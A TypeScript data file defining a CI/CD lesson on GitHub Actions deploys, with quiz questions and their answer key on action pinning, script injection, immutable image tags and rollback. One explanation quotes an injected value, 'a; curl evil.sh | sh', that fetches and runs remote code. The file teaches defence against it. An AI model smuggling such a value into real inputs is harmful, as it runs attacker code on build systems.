import type { Lesson } from "../types";

const SECURE = "https://docs.github.com/en/actions/reference/security/secure-use";

export const lesson0024: Lesson = {
  slug: "0024-ci-cd",
  number: 24,
  track: "ship",
  title: "From merge to deploy",
  summary:
    "Merge to main, and tested images reach the registry and the server, or the server rolls itself back. A deploy script you test with fake docker, and a workflow that passes actionlint and a security review.",
  minutes: 110,
  status: "ready",
  builds: "`deploy.sh` (pull, start, health-check, roll back) and `deploy.yml` (test → build → deploy, pinned, least privilege)",
  lab: { dir: "0024-ci-cd", writes: ["deploy.sh", "deploy.yml"], check: "bash check.sh" },
  reference: "ship",
  warmup: [
    { lesson: "0022-compose-in-production", question: 3 },
    { lesson: "0021-server-from-zero", question: 2 },
  ],
  words: ["continuous delivery", "immutable image tag", "rollback", "GITHUB_TOKEN permissions", "script injection", "action pinning"],
  answers: [
    { id: "codearena", label: "Section 6: the secrets and settings your pipeline needs, and where each lives" },
    { id: "challenge", label: "Challenge: a real rollback, timed (optional)" },
  ],
  quiz: [
    {
      prompt: "Why pin `uses: actions/checkout@<40-character SHA>` rather than `@v4`?",
      options: [
        "A SHA makes the workflow start faster, as nothing is resolved",
        "GitHub refuses to run actions that are referenced by a tag",
        "A tag can be repointed to other code, but SHAs cannot",
        "A SHA pins the runner's whole operating system image as well",
      ],
      correct: 2,
      why: `Tags move. In March 2025 the popular \`tj-actions/changed-files\` was compromised and its tags pointed at code that leaked secrets ([CISA alert](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)). Workflows pinned to a SHA kept running the reviewed code. GitHub now also offers workflow lockfiles, which pin transitive dependencies too ([secure use](${SECURE})).`,
    },
    {
      prompt: "Why pass `${{ inputs.tag }}` to a `run:` script through `env:`, instead of writing it in the script?",
      options: [
        "Env values are encrypted, while every expression ends up in the logs",
        "Inputs are not available as expressions inside a run step at all",
        "The env block runs on a different runner, isolated from the script",
        "The expression is pasted into the script before the shell parses it",
      ],
      correct: 3,
      why: `\`\${{ }}\` is replaced in the script's text before bash sees it, so a value like \`a; curl evil.sh | sh\` becomes code: script injection. Through \`env:\`, it arrives as a variable, and \`"$TAG"\` is only ever data. GitHub's guidance recommends exactly this ([secure use](${SECURE})).`,
    },
    {
      prompt: "Why tag images with the commit SHA rather than `latest`?",
      options: [
        "Registries delete the images tagged latest once they are thirty days old",
        "Each deploy names exactly which code runs, so rollback is a tag",
        "SHA tags make the images smaller, since layers are shared between them",
        "Docker refuses to pull the same tag twice on the same server",
      ],
      correct: 1,
      why: "An image tag that never changes means \"what's running?\" has a one-word answer, and every past version stays pullable. Rolling back is deploying an older SHA: no rebuild, no guessing.",
    },
    {
      prompt: "Why `concurrency` with `cancel-in-progress: false` for deploys?",
      options: [
        "Killing a deploy halfway can leave the server between two versions",
        "GitHub bills a cancelled run as if it had fully completed",
        "A cancelled run deletes the images that its build job pushed",
        "Concurrency groups only work properly when no run is ever cancelled",
      ],
      correct: 0,
      why: "Two quick merges must not deploy at the same time, so they share a concurrency group and queue. But cancelling the running one could stop it between `pull` and `up`, or mid-rollback. Let it finish; the next one follows ([concurrency](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)).",
    },
    {
      prompt: "Why does `deploy.sh` run `up -d --wait` and a health check before writing `current-tag`?",
      options: [
        "So a broken release is caught, and the old one restored",
        "So Docker can download the images in parallel, which is faster",
        "So the logs show the version number before the containers start",
        "So the firewall opens port 443 only when the app's ready",
      ],
      correct: 0,
      why: "`--wait` returns only once the services are running or healthy, and fails otherwise ([compose up](https://docs.docker.com/reference/cli/docker/compose/up/)); `/health` checks the app answers through the proxy. Only then is the new tag recorded. Either check failing restores the recorded tag: a rollback that runs without you.",
    },
  ],
};
